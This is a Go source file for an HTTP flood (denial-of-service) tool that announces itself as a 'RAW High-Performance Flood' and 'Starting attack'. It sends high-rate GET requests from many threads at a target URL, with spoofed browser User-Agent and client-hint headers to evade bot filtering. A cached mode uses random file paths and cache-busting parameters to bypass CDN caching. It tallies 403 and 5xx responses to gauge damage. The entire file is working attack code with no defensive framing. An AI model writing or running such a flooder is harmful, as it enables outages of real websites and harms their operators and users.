package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	// Realistic User-Agents for diversity
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}
	
	// Accept languages for diversity
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,th;q=0.8",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"th-TH,th;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	cached       bool
	rate         int
	target       string
	targetURL    *url.URL
	
	status_200   uint64
	status_403   uint64
	status_5xx   uint64
	status_other uint64
	
	// Connection pool for reuse
	clientPool sync.Pool
)

func main() {
	rand.Seed(time.Now().UnixNano())
	if len(os.Args) < 5 {
		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> [--cached]", os.Args[0])
	}
	
	var err error
	targetURL, err = url.Parse(os.Args[1])
	if err != nil {
		log.Fatal("Failed to parse url")
	}
	if targetURL.Host == "" {
		log.Fatal("Invalid url provided")
	}
	
	target = os.Args[1]
	rate, _ = strconv.Atoi(os.Args[2])
	secs, _ := strconv.Atoi(os.Args[3])
	thr, _ := strconv.Atoi(os.Args[4])
	if rate < 1 || secs < 1 || thr < 1 {
		log.Fatal("Invalid args")
	}
	
	for _, arg := range os.Args {
		if strings.ToLower(arg) == "--cached" {
			cached = true
			break
		}
	}

	if cached {
		target = prepareUrl(target)
	}

	// Initialize client pool
	clientPool = sync.Pool{
		New: func() interface{} {
			return createOptimizedClient()
		},
	}

	fmt.Printf("RAW High-Performance Flood\nTarget: %s\nRate: %d/s\nThreads: %d\nDuration: %ds\n", target, rate, thr, secs)
	fmt.Println("Starting attack...")

	// Start worker threads
	for i := 0; i < thr; i++ {
		if cached {
			go flooderCached()
		} else {
			go flooder()
		}
	}
	
	// Start stats reporter
	go statsReporter()
	
	// Wait for duration
	time.Sleep(time.Duration(secs) * time.Second)
	
	// Print final stats
	fmt.Printf("\nFinal Stats:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", 
		atomic.LoadUint64(&status_200), 
		atomic.LoadUint64(&status_403), 
		atomic.LoadUint64(&status_5xx), 
		atomic.LoadUint64(&status_other))
}

func createOptimizedClient() *http.Client {
	// Create custom transport with optimized settings
	transport := &http.Transport{
		Proxy: nil, // No proxy - direct connection
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}
			// Optimize TCP settings
			conn, err := dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, err
			}
			// Set TCP no delay for lower latency
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetNoDelay(true)
				tcpConn.SetKeepAlive(true)
				tcpConn.SetKeepAlivePeriod(30 * time.Second)
			}
			return conn, nil
		},
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
			PreferServerCipherSuites: false,
			SessionTicketsDisabled:   false,
			ClientSessionCache:       tls.NewLRUClientSessionCache(64),
		},
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   100,
		MaxConnsPerHost:       0, // No limit
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		ForceAttemptHTTP2:     true,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}
}

func getOptimizedHeaders() http.Header {
	userAgent := userAgents[rand.Intn(len(userAgents))]
	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
	
	headers := http.Header{
		"User-Agent":                {userAgent},
		"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
		"Accept-Language":           {acceptLang},
		"Accept-Encoding":           {"gzip, deflate, br"},
		"Cache-Control":             {"no-cache"},
		"Upgrade-Insecure-Requests": {"1"},
		"Connection":                {"keep-alive"},
	}
	
	// Add browser-specific headers
	if strings.Contains(userAgent, "Chrome") {
		headers["Sec-Ch-Ua"] = []string{`"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"`}
		headers["Sec-Ch-Ua-Mobile"] = []string{"?0"}
		headers["Sec-Ch-Ua-Platform"] = []string{`"Windows"`}
		headers["Sec-Fetch-Dest"] = []string{"document"}
		headers["Sec-Fetch-Mode"] = []string{"navigate"}
		headers["Sec-Fetch-Site"] = []string{"none"}
		headers["Sec-Fetch-User"] = []string{"?1"}
	}
	
	return headers
}

func randPath() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	
	extensions := []string{".js", ".css", ".html", ".php", ".asp", ".jsp", ".json", ".xml"}
	ext := extensions[rand.Intn(len(extensions))]
	return fmt.Sprintf("%s%s", string(b), ext)
}

func prepareUrl(urlToModify string) string {
	modified, err := url.Parse(urlToModify)
	if err != nil {
		log.Fatal("Failed to parse URL")
	}
	newPath := strings.TrimSuffix(modified.Path, "/") + "/SOMESHIT.js"
	modified.Path = newPath
	return modified.String()
}

func flooder() {
	// Get client from pool
	client := clientPool.Get().(*http.Client)
	defer clientPool.Put(client)
	
	// Create request buffer for reuse
	reqBuf := make([]*http.Request, rate)
	
	for {
		// Prepare batch of requests
		for i := 0; i < rate; i++ {
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				continue
			}
			req.Header = getOptimizedHeaders()
			req.Close = false // Keep connection alive
			reqBuf[i] = req
		}
		
		// Send requests in rapid succession
		for i := 0; i < rate; i++ {
			if reqBuf[i] == nil {
				continue
			}
			
			go func(req *http.Request) {
				resp, err := client.Do(req)
				if err != nil {
					atomic.AddUint64(&status_other, 1)
					return
				}
				
				// Quick status code check
				switch {
				case resp.StatusCode == 200:
					atomic.AddUint64(&status_200, 1)
				case resp.StatusCode == 403:
					atomic.AddUint64(&status_403, 1)
				case resp.StatusCode >= 500 && resp.StatusCode < 600:
					atomic.AddUint64(&status_5xx, 1)
				default:
					atomic.AddUint64(&status_other, 1)
				}
				
				// Quickly drain and close body
				resp.Body.Close()
			}(reqBuf[i])
		}
		
		// Small delay between batches to prevent overwhelming
		time.Sleep(time.Millisecond)
	}
}

func flooderCached() {
	// Get client from pool
	client := clientPool.Get().(*http.Client)
	defer clientPool.Put(client)
	
	// Pre-generate random paths for efficiency
	paths := make([]string, 100)
	for i := range paths {
		paths[i] = randPath()
	}
	pathIndex := 0
	
	for {
		for i := 0; i < rate; i++ {
			// Rotate through pre-generated paths
			randomUrl := strings.ReplaceAll(target, "SOMESHIT.js", paths[pathIndex])
			pathIndex = (pathIndex + 1) % len(paths)
			
			// Add cache-busting parameters
			if rand.Intn(3) == 0 {
				randomUrl += fmt.Sprintf("?v=%d&t=%d", rand.Intn(1000000), time.Now().Unix())
			}
			
			req, err := http.NewRequest("GET", randomUrl, nil)
			if err != nil {
				continue
			}
			
			req.Header = getOptimizedHeaders()
			req.Close = false
			
			go func(req *http.Request) {
				resp, err := client.Do(req)
				if err != nil {
					atomic.AddUint64(&status_other, 1)
					return
				}
				
				// Quick status code check
				switch {
				case resp.StatusCode == 200:
					atomic.AddUint64(&status_200, 1)
				case resp.StatusCode == 403:
					atomic.AddUint64(&status_403, 1)
				case resp.StatusCode >= 500 && resp.StatusCode < 600:
					atomic.AddUint64(&status_5xx, 1)
				default:
					atomic.AddUint64(&status_other, 1)
				}
				
				resp.Body.Close()
			}(req)
		}
		
		// Small delay between batches
		time.Sleep(time.Millisecond)
	}
}

func statsReporter() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	
	fmt.Println("\nRAW FLOOD STATS:")
	for range ticker.C {
		fmt.Printf("\r200 OK: %d | 403 FBDN: %d | 5xx DROP: %d | OTHER: %d", 
			atomic.LoadUint64(&status_200), 
			atomic.LoadUint64(&status_403), 
			atomic.LoadUint64(&status_5xx), 
			atomic.LoadUint64(&status_other))
	}
}
